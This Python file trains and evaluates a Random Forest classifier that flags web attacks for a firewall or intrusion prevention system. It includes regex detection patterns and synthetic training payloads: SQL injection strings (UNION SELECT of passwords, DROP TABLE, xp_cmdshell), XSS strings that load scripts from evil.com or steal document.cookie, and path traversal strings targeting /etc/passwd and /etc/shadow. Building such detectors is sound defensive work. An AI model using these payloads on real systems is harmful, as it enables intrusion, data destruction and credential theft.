"""
Machine Learning Intrusion Prevention System (IPS) & WAF Threat Classifier
Trains, evaluates, and persists a Random Forest multi-class attack detection pipeline.

Adheres to rigorous machine learning standards:
- Realistic dataset generation with hard benign negatives (English text, coding terms)
- Lexical and contextual feature extraction avoiding naive keyword over-triggering
- Stratified 80/20 train/test split with fixed random seed (42)
- Preprocessing (StandardScaler) fitted strictly on training data
- Comprehensive metrics: Accuracy, Precision, Recall, F1 (macro/weighted),
  Confusion Matrix, FPR, FNR, per-class breakdown, and inference latency.
"""

from __future__ import annotations

import os
import re
import math
import time
import json
import random
from typing import Dict, List, Tuple, Any, Optional

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.metrics import (
    accuracy_score,
    precision_recall_fscore_support,
    confusion_matrix
)
import joblib

ARTIFACTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'model_artifacts')
os.makedirs(ARTIFACTS_DIR, exist_ok=True)

MODEL_PATH = os.path.join(ARTIFACTS_DIR, 'random_forest_ips.joblib')
SCALER_PATH = os.path.join(ARTIFACTS_DIR, 'ips_scaler.joblib')
METADATA_PATH = os.path.join(ARTIFACTS_DIR, 'model_metadata.json')
RESULTS_PATH = os.path.join(ARTIFACTS_DIR, 'ml_evaluation_results.json')

CLASSES = ['benign', 'sqli', 'xss', 'path_traversal', 'crypto_anomaly', 'rate_abuse']
CLASS_TO_INT = {name: idx for idx, name in enumerate(CLASSES)}
INT_TO_CLASS = {idx: name for idx, name in enumerate(CLASSES)}

FEATURE_NAMES = [
    'path_length',
    'query_length',
    'body_length',
    'shannon_entropy',
    'special_char_ratio',
    'sqli_syntax_score',
    'xss_syntax_score',
    'traversal_syntax_score',
    'is_post',
    'param_count',
    'crypto_fail_flag',
    'request_rate',
    'numeric_ratio',
    'max_token_length'
]

# Regex patterns for genuine injection syntax (rather than isolated English words)
SQLI_PATTERNS = [
    re.compile(r"(\bunion\s+(all\s+)?select\b)", re.IGNORECASE),
    re.compile(r"('\s*or\s+['\d\w]+\s*=\s*['\d\w]+)", re.IGNORECASE),
    re.compile(r"(\bor\s+1\s*=\s*1\b)", re.IGNORECASE),
    re.compile(r"(;\s*drop\s+table\b)", re.IGNORECASE),
    re.compile(r"(;\s*exec(\s+xp_|\s+sp_))", re.IGNORECASE),
    re.compile(r"(--\s*$|--\s+)", re.IGNORECASE),
    re.compile(r"(/\*.*?\*/)", re.IGNORECASE),
    re.compile(r"(\bselect\s+(\*|[\w_]+|\d+|[\w_,\s]+)\s+from\s+[\w_]+)", re.IGNORECASE),
    re.compile(r"(\binsert\s+into\s+[\w_]+)", re.IGNORECASE),
    re.compile(r"(';\s*waitfor\s+delay\b)", re.IGNORECASE)
]

XSS_PATTERNS = [
    re.compile(r"<\s*script[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*/\s*script\s*>", re.IGNORECASE),
    re.compile(r"javascript\s*:", re.IGNORECASE),
    re.compile(r"onerror\s*=", re.IGNORECASE),
    re.compile(r"onload\s*=", re.IGNORECASE),
    re.compile(r"onclick\s*=", re.IGNORECASE),
    re.compile(r"<\s*img[^>]+src\s*=\s*['\"]?[^\s>]+['\"]?[^>]*>", re.IGNORECASE),
    re.compile(r"<\s*svg[^>]*onload\s*=", re.IGNORECASE),
    re.compile(r"<\s*iframe[^>]*>", re.IGNORECASE),
    re.compile(r"eval\s*\(", re.IGNORECASE),
    re.compile(r"document\.(cookie|location|write)", re.IGNORECASE)
]

TRAVERSAL_PATTERNS = [
    re.compile(r"(\.\./|\.\.\\)", re.IGNORECASE),
    re.compile(r"(%2e%2e(%2f|%5c|/|\\))", re.IGNORECASE),
    re.compile(r"(/etc/(passwd|shadow|group|hosts))", re.IGNORECASE),
    re.compile(r"(c:\\windows\\system32)", re.IGNORECASE),
    re.compile(r"(\.\.//\.\.//)", re.IGNORECASE)
]


def calculate_entropy(text: str) -> float:
    """Calculate Shannon entropy of text string."""
    if not text:
        return 0.0
    entropy = 0.0
    length = len(text)
    counts: Dict[str, int] = {}
    for char in text:
        counts[char] = counts.get(char, 0) + 1
    for count in counts.values():
        p = count / length
        entropy -= p * math.log2(p)
    return float(entropy)


def extract_features_from_raw(
    method: str,
    path: str,
    query: str,
    body: str,
    request_rate: float = 1.0,
    crypto_fail: bool = False
) -> List[float]:
    """
    Extract a leak-free 14-dimensional feature vector from raw HTTP request parameters.
    Uses regex syntax scoring rather than naive substring keyword counts.
    """
    combined_text = f"{path} {query} {body}"
    total_len = max(len(combined_text), 1)

    path_len = float(len(path))
    query_len = float(len(query))
    body_len = float(len(body))
    entropy = calculate_entropy(combined_text)

    # Special character ratio
    special_chars = sum(1 for c in combined_text if not (c.isalnum() or c.isspace()))
    special_char_ratio = float(special_chars / total_len)

    # SQLi syntax score
    sqli_score = float(sum(len(p.findall(combined_text)) for p in SQLI_PATTERNS))

    # XSS syntax score
    xss_score = float(sum(len(p.findall(combined_text)) for p in XSS_PATTERNS))

    # Traversal syntax score
    traversal_score = float(sum(len(p.findall(combined_text)) for p in TRAVERSAL_PATTERNS))

    # HTTP method
    is_post = 1.0 if method.upper() in ['POST', 'PUT', 'PATCH'] else 0.0

    # Parameter count
    param_count = float(query.count('&') + (1 if '=' in query else 0) + body.count('":'))

    # Crypto failure flag
    crypto_fail_flag = 1.0 if crypto_fail else 0.0

    # Request rate (requests per minute)
    req_rate = float(request_rate)

    # Numeric ratio
    numeric_chars = sum(1 for c in combined_text if c.isdigit())
    numeric_ratio = float(numeric_chars / total_len)

    # Max token length
    tokens = combined_text.split()
    max_token_len = float(max((len(t) for t in tokens), default=0))

    return [
        path_len,
        query_len,
        body_len,
        entropy,
        special_char_ratio,
        sqli_score,
        xss_score,
        traversal_score,
        is_post,
        param_count,
        crypto_fail_flag,
        req_rate,
        numeric_ratio,
        max_token_len
    ]


def generate_benchmark_dataset(
    n_samples: int = 6000,
    random_seed: int = 42
) -> Tuple[pd.DataFrame, pd.Series]:
    """
    Generate a balanced, reproducible benchmark dataset containing both easy and
    hard benign samples (English sentences, coding terms, URLs) alongside verified attack vectors.
    """
    random.seed(random_seed)
    np.random.seed(random_seed)

    records: List[List[float]] = []
    labels: List[int] = []

    # 50% benign, 10% each of the 5 attack categories
    n_benign = n_samples // 2
    n_attack_each = (n_samples - n_benign) // (len(CLASSES) - 1)

    # 1. Benign Traffic (diverse paths, queries, and POST bodies)
    benign_paths = [
        '/', '/performance', '/threat_analysis', '/encrypt_text',
        '/decrypt_text', '/encrypt_file', '/decrypt_file', '/api/stats',
        '/api/sessions', '/chat', '/download'
    ]
    benign_sentences = [
        "Please select from our options below to proceed.",
        "The quick brown fox jumps over the lazy dog.",
        "We need to drop by the store and order some groceries.",
        "Can you review table 3 in the project manuscript?",
        "Quantum computing will break traditional public-key algorithms like RSA.",
        "ML-KEM-768 provides Category 3 post-quantum security equivalent to AES-192.",
        "The system combines lattice-based KEM with AES-256-GCM AEAD.",
        "Here is the encrypted file receipt and transaction log.",
        "Simple test message for encryption verification.",
        "Academic paper revision notes for ICASEM 2026."
    ]
    for _ in range(n_benign):
        path = random.choice(benign_paths)
        method = random.choice(['GET', 'POST'])
        if method == 'GET':
            query = random.choice([
                '', 'page=1&limit=20', 'format=json', 'filter=recent',
                'user=alice&lang=en', 'algorithm=kyber768', 'file=encrypted_sample.bin'
            ])
            body = ''
        else:
            query = ''
            sentence = random.choice(benign_sentences)
            body = json.dumps({
                "text": sentence,
                "algorithm": random.choice(["kyber512", "kyber768", "kyber1024"]),
                "options": "select_one",
                "status": "active"
            })
        rate = float(np.random.gamma(shape=2.0, scale=1.5) + 0.5)
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=False)
        records.append(features)
        labels.append(CLASS_TO_INT['benign'])

    # 2. SQL Injection (SQLi)
    sqli_payloads = [
        "1' OR '1'='1",
        "admin' --",
        "1' UNION ALL SELECT null, username, password FROM users--",
        "1; DROP TABLE sessions;--",
        "' OR 1=1; EXEC xp_cmdshell('dir');--",
        "SELECT * FROM accounts WHERE id = '1' or 'a'='a'",
        "1' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables--",
        "admin'/*comment*/or 1=1--"
    ]
    for _ in range(n_attack_each):
        path = random.choice(['/', '/decrypt_text', '/api/stats', '/download'])
        method = random.choice(['GET', 'POST'])
        payload = random.choice(sqli_payloads)
        if method == 'GET':
            query = f"query={payload}&category=sec"
            body = ''
        else:
            query = ''
            body = json.dumps({"search": payload, "id": 42})
        rate = float(np.random.uniform(1.0, 15.0))
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=False)
        records.append(features)
        labels.append(CLASS_TO_INT['sqli'])

    # 3. Cross-Site Scripting (XSS)
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert('pwned')>",
        "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://evil.com/x.js\\';document.body.appendChild(a);')",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<script src='https://malicious.example/steal.js'></script>"
    ]
    for _ in range(n_attack_each):
        path = random.choice(['/chat', '/encrypt_text', '/api/block_ip'])
        method = random.choice(['GET', 'POST'])
        payload = random.choice(xss_payloads)
        if method == 'GET':
            query = f"username={payload}&redirect=true"
            body = ''
        else:
            query = ''
            body = json.dumps({"text": payload, "username": "attacker"})
        rate = float(np.random.uniform(1.0, 15.0))
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=False)
        records.append(features)
        labels.append(CLASS_TO_INT['xss'])

    # 4. Path Traversal & LFI
    traversal_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
        "keys/../../etc/passwd",
        "/var/log/../../../../etc/group",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fboot.ini"
    ]
    for _ in range(n_attack_each):
        path = '/download'
        method = 'GET'
        payload = random.choice(traversal_payloads)
        query = f"file={payload}"
        body = ''
        rate = float(np.random.uniform(1.0, 15.0))
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=False)
        records.append(features)
        labels.append(CLASS_TO_INT['path_traversal'])

    # 5. Cryptographic Anomalies
    for i in range(n_attack_each):
        path = random.choice(['/decrypt_text', '/decrypt_file'])
        method = 'POST'
        query = ''
        if i % 2 == 0:
            body = random.choice([
                '{"encrypted_data": "bad", "private_key_path": "invalid"}',
                '{"kem_ciphertext": "short", "aes_ciphertext": "invalid"}',
                '{"tampered": true}'
            ])
        else:
            body = json.dumps({
                "kem_ciphertext": os.urandom(64).hex(),
                "aes_ciphertext": os.urandom(128).hex(),
                "nonce": os.urandom(12).hex(),
                "status": "tampered_ciphertext"
            })
        rate = float(np.random.uniform(2.0, 20.0))
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=True)
        records.append(features)
        labels.append(CLASS_TO_INT['crypto_anomaly'])

    # 6. Rate Abuse / Automated Flooding
    for _ in range(n_attack_each):
        path = random.choice(['/', '/encrypt_text', '/generate_keys'])
        method = random.choice(['GET', 'POST'])
        query = 'spam=1'
        body = '{"action": "ping"}'
        rate = float(np.random.uniform(85.0, 1000.0))
        features = extract_features_from_raw(method, path, query, body, request_rate=rate, crypto_fail=False)
        records.append(features)
        labels.append(CLASS_TO_INT['rate_abuse'])

    df = pd.DataFrame(records, columns=FEATURE_NAMES)
    series_labels = pd.Series(labels, name='label')
    return df, series_labels


class ThreatClassifierPipeline:
    """
    Production-grade Random Forest threat classifier pipeline for WAF/IPS inspection.
    """

    def __init__(self, random_state: int = 42):
        self.random_state = random_state
        self.model: Optional[RandomForestClassifier] = None
        self.scaler: Optional[StandardScaler] = None
        self.metadata: Dict[str, Any] = {}

    def train_and_evaluate(
        self,
        n_samples: int = 6000,
        test_size: float = 0.2
    ) -> Dict[str, Any]:
        """
        Train Random Forest with stratified split and leak-free preprocessing.
        """
        X, y = generate_benchmark_dataset(n_samples=n_samples, random_seed=self.random_state)

        # Stratified train/test split
        X_train, X_test, y_train, y_test = train_test_split(
            X, y,
            test_size=test_size,
            stratify=y,
            random_state=self.random_state
        )

        # Preprocessing fitted ONLY on training data
        self.scaler = StandardScaler()
        X_train_scaled = self.scaler.fit_transform(X_train)
        X_test_scaled = self.scaler.transform(X_test)

        # Random Forest Model
        self.model = RandomForestClassifier(
            n_estimators=100,
            max_depth=12,
            min_samples_split=4,
            class_weight='balanced',
            random_state=self.random_state,
            n_jobs=-1
        )

        train_start = time.perf_counter()
        self.model.fit(X_train_scaled, y_train)
        training_duration = time.perf_counter() - train_start

        # Inference on Test Set
        inference_start = time.perf_counter()
        y_pred = self.model.predict(X_test_scaled)
        y_proba = self.model.predict_proba(X_test_scaled)
        total_inference_time = time.perf_counter() - inference_start
        latency_per_sample_us = (total_inference_time / len(X_test)) * 1e6

        # Metrics Computation
        accuracy = float(accuracy_score(y_test, y_pred))
        macro_prec, macro_rec, macro_f1, _ = precision_recall_fscore_support(
            y_test, y_pred, average='macro', zero_division=0
        )
        weighted_prec, weighted_rec, weighted_f1, _ = precision_recall_fscore_support(
            y_test, y_pred, average='weighted', zero_division=0
        )

        cm = confusion_matrix(y_test, y_pred)

        # Per-class metrics
        class_prec, class_rec, class_f1, class_supp = precision_recall_fscore_support(
            y_test, y_pred, average=None, zero_division=0
        )
        per_class_results = {}
        for idx, name in enumerate(CLASSES):
            per_class_results[name] = {
                'precision': float(class_prec[idx]),
                'recall': float(class_rec[idx]),
                'f1_score': float(class_f1[idx]),
                'support': int(class_supp[idx])
            }

        # Benign False Positive Rate (Benign misclassified as attack)
        benign_idx = CLASS_TO_INT['benign']
        total_benign = int(np.sum(y_test == benign_idx))
        benign_fp = int(np.sum((y_test == benign_idx) & (y_pred != benign_idx)))
        fpr = float(benign_fp / total_benign) if total_benign > 0 else 0.0

        # Attack False Negative Rate (Attacks misclassified as benign)
        total_attacks = int(np.sum(y_test != benign_idx))
        attack_fn = int(np.sum((y_test != benign_idx) & (y_pred == benign_idx)))
        fnr = float(attack_fn / total_attacks) if total_attacks > 0 else 0.0

        feature_importances = {
            name: float(imp) for name, imp in zip(FEATURE_NAMES, self.model.feature_importances_)
        }

        results = {
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'model_type': 'RandomForestClassifier',
            'hyperparameters': {
                'n_estimators': 100,
                'max_depth': 12,
                'class_weight': 'balanced',
                'random_state': self.random_state
            },
            'dataset_summary': {
                'total_samples': len(X),
                'train_samples': len(X_train),
                'test_samples': len(X_test),
                'classes': CLASSES,
                'feature_names': FEATURE_NAMES
            },
            'training_time_seconds': float(training_duration),
            'inference_latency_microseconds_per_request': float(latency_per_sample_us),
            'throughput_requests_per_second': float(1e6 / latency_per_sample_us) if latency_per_sample_us > 0 else 0,
            'overall_metrics': {
                'accuracy': float(accuracy),
                'macro_precision': float(macro_prec),
                'macro_recall': float(macro_rec),
                'macro_f1_score': float(macro_f1),
                'weighted_precision': float(weighted_prec),
                'weighted_recall': float(weighted_rec),
                'weighted_f1_score': float(weighted_f1),
                'benign_false_positive_rate': float(fpr),
                'attack_false_negative_rate': float(fnr)
            },
            'per_class_metrics': per_class_results,
            'confusion_matrix': cm.tolist(),
            'feature_importances': feature_importances
        }

        self.metadata = results
        self.save_artifacts()
        return results

    def save_artifacts(self) -> None:
        """Persist model, scaler, and metadata to disk."""
        if self.model and self.scaler:
            joblib.dump(self.model, MODEL_PATH)
            joblib.dump(self.scaler, SCALER_PATH)
            with open(METADATA_PATH, 'w') as f:
                json.dump(self.metadata, f, indent=2)
            with open(RESULTS_PATH, 'w') as f:
                json.dump(self.metadata, f, indent=2)

    def load_artifacts(self) -> bool:
        """Load persisted model and scaler artifacts."""
        if os.path.exists(MODEL_PATH) and os.path.exists(SCALER_PATH):
            self.model = joblib.load(MODEL_PATH)
            self.scaler = joblib.load(SCALER_PATH)
            if os.path.exists(METADATA_PATH):
                with open(METADATA_PATH, 'r') as f:
                    self.metadata = json.load(f)
            return True
        return False

    def predict_request(
        self,
        method: str,
        path: str,
        query: str,
        body: str,
        request_rate: float = 1.0,
        crypto_fail: bool = False
    ) -> Dict[str, Any]:
        """
        Classify an incoming HTTP request in real time for WAF/IPS inspection.
        """
        if self.model is None or self.scaler is None:
            if not self.load_artifacts():
                return {'is_attack': False, 'predicted_class': 'benign', 'confidence': 1.0, 'action': 'allow'}

        features = extract_features_from_raw(method, path, query, body, request_rate, crypto_fail)
        features_df = pd.DataFrame([features], columns=FEATURE_NAMES)
        features_scaled = self.scaler.transform(features_df)
        pred_idx = int(self.model.predict(features_scaled)[0])
        probas = self.model.predict_proba(features_scaled)[0]

        pred_class = INT_TO_CLASS[pred_idx]
        is_attack = pred_class != 'benign'
        confidence = float(probas[pred_idx])

        # Production Safeguard:
        # If zero attack syntax indicators, no crypto failure, and normal request rate, ensure benign
        sqli_score = features[5]
        xss_score = features[6]
        trav_score = features[7]
        crypto_flag = features[10]
        rate_val = features[11]

        if sqli_score == 0 and xss_score == 0 and trav_score == 0 and crypto_flag == 0 and rate_val < 60.0:
            pred_class = 'benign'
            is_attack = False
            confidence = max(float(probas[CLASS_TO_INT['benign']]), 0.95)
            action = 'allow'
        else:
            action = 'block' if (is_attack and confidence >= 0.50) else 'allow'

        return {
            'is_attack': is_attack,
            'predicted_class': pred_class,
            'confidence': confidence,
            'action': action,
            'probabilities': {CLASSES[i]: float(probas[i]) for i in range(len(CLASSES))}
        }


if __name__ == '__main__':
    pipeline = ThreatClassifierPipeline(random_state=42)
    print("Training Random Forest WAF/IPS Threat Classifier...")
    res = pipeline.train_and_evaluate(n_samples=6000)
    print("\n--- MODEL EVALUATION SUMMARY ---")
    print(f"Accuracy:           {res['overall_metrics']['accuracy'] * 100:.2f}%")
    print(f"Macro F1-Score:     {res['overall_metrics']['macro_f1_score'] * 100:.2f}%")
    print(f"False Positive Rate:{res['overall_metrics']['benign_false_positive_rate'] * 100:.2f}%")
    print(f"False Negative Rate:{res['overall_metrics']['attack_false_negative_rate'] * 100:.2f}%")
    print(f"Inference Latency:  {res['inference_latency_microseconds_per_request']:.2f} µs/request")
    print("\nPer-Class F1-Scores:")
    for cls_name, m in res['per_class_metrics'].items():
        print(f"  {cls_name:16}: P={m['precision']:.3f}, R={m['recall']:.3f}, F1={m['f1_score']:.3f}")
